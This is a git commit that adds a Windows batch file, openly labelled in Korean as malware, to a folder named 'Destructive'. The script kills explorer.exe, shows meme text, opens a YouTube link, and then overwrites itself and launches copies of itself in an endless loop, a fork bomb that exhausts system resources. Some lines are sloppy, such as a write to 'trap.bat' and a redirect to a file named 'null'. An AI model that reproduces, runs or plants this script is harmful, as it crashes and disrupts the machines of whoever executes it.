07848ef53bcae75215ffd4d57cd08be826e63c68
jjoMooNo-Alt <jjomoonodev@gmail.com>
2026-02-28 19:33:00 +0900

    Create ChangSeopBatch.bat

---
+++ Files/Destructive/ChangSeopBatch.bat
@@ -0,0 +1,29 @@
+:: 해당 파일은 멀웨어입니다. 경고를 무시하고 실행하여 발생한 피해는 실행한 당사자에게 있습니다.
+
+@echo off
+echo 해당 파일은 멀웨어입니다. 경고를 무시하고 실행하여 발생하는 모든 피해에 대한 책임은 파일을 실행한 당사자에게 있습니다.
+echo Copyright 2026 by jjoMooNo
+pause
+taskkill -f -im explorer.exe
+cls
+echo CPU100퍼드가자
+timeout 3 >> null
+echo 신창섭 을숭베하심시오
+timeout 2 >> null
+cls
+color 4
+echo The God Of JungSangHwa
+start explorer
+timeout 2 >> null
+start https://youtu.be/m1qtNXGAtD4?si=fgqdJi-zTM1Hn8X9
+timeout 2 >> null
+taskkill -f -im explorer.exe
+echo @echo off > ChangSeopBatch.bat
+echo color 4 >> ChangSeopBatch.bat
+echo :a >> ChangSeopBatch.bat
+echo echo 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 정상화 >> trap.bat
+echo goto a  >> ChangSeopBatch.bat
+:a
+start ChangSeopBatch.bat
+timeout 0.5 >> null
+goto a
